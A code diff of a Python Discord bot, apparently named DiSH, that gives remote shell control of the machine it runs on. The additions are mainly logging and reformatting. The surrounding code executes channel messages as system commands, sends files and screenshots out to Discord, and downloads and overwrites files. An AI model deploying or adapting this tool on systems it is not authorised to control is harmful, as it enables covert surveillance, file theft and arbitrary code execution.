@@ -7,17 +7,65 @@ import asyncio
 import functools
 import time
 import dotenv
+import sys
+import platform
+from datetime import datetime
+import logging
+import utils
+import logging.handlers
 
-dotenv_path = os.path.normpath(os.environ["appdata"]+"/dish/.env") if os.path.exists(os.environ["appdata"]+"/dish/.env") else ".env"
+# Dirs and other useless stuff start here!
+
+formatted_now = datetime.now().strftime("%d-%m-%Y %Y-%M-%S")
+
+dish_dir = (
+    os.path.normpath(os.environ["appdata"] + "/dish/")
+    if os.path.exists(os.environ["appdata"] + "/dish/")
+    and platform.system().lower() == "windows"
+    else "."
+)
+
+dotenv_path = (
+    os.path.normpath(os.environ["appdata"] + "/dish/.env")
+    if os.path.exists(os.environ["appdata"] + "/dish/.env")
+    else ".env"
+)
 try:
     dotenv.load_dotenv(dotenv_path)
 except:
     traceback.print_exc()
 
+# Log config starts here
+
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s - %(levelname)s - %(message)s",
+    filemode="w",
+)
+
+fileHandler = logging.handlers.RotatingFileHandler(
+    filename=f"{dish_dir}/dish{formatted_now}.log",
+    encoding="utf-8",
+    maxBytes=32 * 1024 * 1024,  # 32 MiB
+    backupCount=5
+)
+
+console = logging.StreamHandler()
+logging.getLogger("discord.http").setLevel(logging.INFO)
+formatter = logging.Formatter("%(asctime)s - %(levelname)s - %(message)s")
+console.setFormatter(formatter)
+# logging.getLogger("").addHandler(console)
+log = logging.getLogger("")
+log.addHandler(fileHandler)
+sys.stdout = utils.StreamToLogger(log, logging.INFO)
+sys.stderr = utils.StreamToLogger(log, logging.ERROR)
+
+# DiSH variables start here!
+
 guild_id: int = int(os.getenv("GUILD_ID"))
 category_id: int = int(os.getenv("CATEGORY_ID"))
 try:
-    token:str = os.environ["TOKEN"]
+    token: str = os.environ["TOKEN"]
 except:
     traceback.print_exc()
     exit("No token specified")
@@ -25,10 +73,11 @@ except:
 editor_filename = ""
 file_content = ""
 
+
 async def play(client: discord.Client, message: discord.Message, args: str):
     """
     It plays the sound file that was attached to the message
-    
+
     :param client: The client object
     :type client: discord.Client
     :param message: discord.Message
@@ -39,11 +88,10 @@ async def play(client: discord.Client, message: discord.Message, args: str):
     playsound.playsound(message.attachments[0].url)
 
 
-
 def exec_command(command):
     """
     It executes a command and returns the output and error messages as a tuple.
-    
+
     :param command: The command to be executed
     :return: A tuple of the stdout and stderr of the command.
     """
@@ -55,7 +103,7 @@ def exec_command(command):
 async def dump(client: discord.Client, message: discord.Message, args: str):
     """
     It takes a file or directory, and sends it to the channel.
-    
+
     :param client: discord.Client
     :type client: discord.Client
     :param message: discord.Message
@@ -75,12 +123,13 @@ async def dump(client: discord.Client, message: discord.Message, args: str):
     with open(args, "rb") as fp:
         await message.channel.send(file=discord.File(fp))
 
+
 async def screenshot(client: discord.Client, message: discord.Message, args: str):
 
     """
     It takes a screenshot of the entire screen, saves it to a file, and sends it to the channel the
     command was sent in
-    
+
     :param client: discord.Client - The client that the command was called from
     :type client: discord.Client
     :param message: discord.Message = The message object that triggered the command
@@ -98,7 +147,7 @@ async def screenshot(client: discord.Client, message: discord.Message, args: str
 async def cd(client: discord.Client, message: discord.Message, args: str):
     """
     It changes the directory to the one specified in the arguments.
-    
+
     :param client: The discord client
     :type client: discord.Client
     :param message: The message object that triggered the command
@@ -114,7 +163,7 @@ async def cd(client: discord.Client, message: discord.Message, args: str):
 async def upload(client: discord.Client, message: discord.Message, args: str):
     """
     It downloads the file from the URL, and saves it to the specified location.
-    
+
     :param client: discord.Client - The client that the command was called from
     :type client: discord.Client
     :param message: discord.Message = The message object that triggered the command
@@ -133,11 +182,12 @@ async def upload(client: discord.Client, message: discord.Message, args: str):
             r.close()
         await session.close()
 
+
 async def download(client: discord.Client, message: discord.Message, args: str):
 
     """
     It downloads a file from a URL and saves it to a file.
-    
+
     :param client: discord.Client - The client that the command was sent from
     :type client: discord.Client
     :param message: discord.Message = The message object that triggered the command
@@ -158,11 +208,12 @@ async def download(client: discord.Client, message: discord.Message, args: str):
             r.close()
         await session.close()
 
+
 async def edit(client: discord.Client, message: discord.Message, args: str):
     """
     It sends a message, sends a file, sends another message, waits for a message, writes the message
     content to the file, sends another message.
-    
+
     :param client: the client object
     :type client: discord.Client
     :param message: The message that triggered the command
@@ -175,10 +226,12 @@ async def edit(client: discord.Client, message: discord.Message, args: str):
         await message.channel.send(file=discord.File(args))
     except:
         await message.channel.send("File does not exist :C")
-    
+
     await message.channel.send("Send the new file content")
     try:
-        file_content = await client.wait_for("message", check=lambda m: m.author == message.author, timeout=120)
+        file_content = await client.wait_for(
+            "message", check=lambda m: m.author == message.author, timeout=120
+        )
         f = open(args, "w")
         f.write(file_content.content)
         f.close()
@@ -186,11 +239,12 @@ async def edit(client: discord.Client, message: discord.Message, args: str):
     except asyncio.TimeoutError:
         await message.channel.send("Too much time has passed :C")
 
+
 async def pwd(client: discord.Client, message: discord.Message, args: str):
 
     """
     It sends a message to the channel the command was sent in, saying the current directory
-    
+
     :param client: The client object
     :type client: discord.Client
     :param message: The message object that triggered the command
@@ -204,7 +258,7 @@ async def pwd(client: discord.Client, message: discord.Message, args: str):
 async def browser(client: discord.Client, message: discord.Message, args: str):
     """
     It opens a web browser and goes to the URL specified in the command.
-    
+
     :param client: The client object
     :type client: discord.Client
     :param message: The message object that triggered the command
@@ -213,14 +267,12 @@ async def browser(client: discord.Client, message: discord.Message, args: str):
     :type args: str
     """
 
-
     webbrowser.open(args)
 
 
 # It's a discord client that connects to a specific guild and category, and has a dictionary of
 # modules that can be called.
 class RemoteClient(discord.Client):
-
     def __init__(self, guild_id: int, category_id: int, *args, **kwargs):
         super().__init__(*args, **kwargs)
         self.guild_id: int = guild_id
@@ -236,7 +288,7 @@ class RemoteClient(discord.Client):
             "screenshot": screenshot,
             "upload": upload,
             "download": download,
-            "edit": edit
+            "edit": edit,
         }
 
     async def on_ready(self):
@@ -270,14 +322,16 @@ class RemoteClient(discord.Client):
         """
         It takes a message, splits it into a list of words, and then tries to execute the first word as a
         command. If it can't find the command, it executes the message as a command in the command line.
-        
+
         :param message: The message object that triggered the event
         :type message: discord.Message
         :return: The return value is a tuple of two strings, the first being the stdout and the second being
         the stderr.
         """
-        
-        if message.channel == self.channel or message.channel.id == int(os.getenv("GLOBAL_ID")):
+
+        if message.channel == self.channel or message.channel.id == int(
+            os.getenv("GLOBAL_ID")
+        ):
             if message.author.bot:
                 return
             parsed = message.content.split(" ")
@@ -322,5 +376,7 @@ if __name__ == "__main__":
             pass
         time.sleep(1)
 
-    client = RemoteClient(guild_id, category_id, intents=discord.Intents.all())
-    client.run(token)
+    client = RemoteClient(
+        guild_id, category_id, intents=discord.Intents.all()
+    )
+    client.run(token, log_level=logging.INFO)
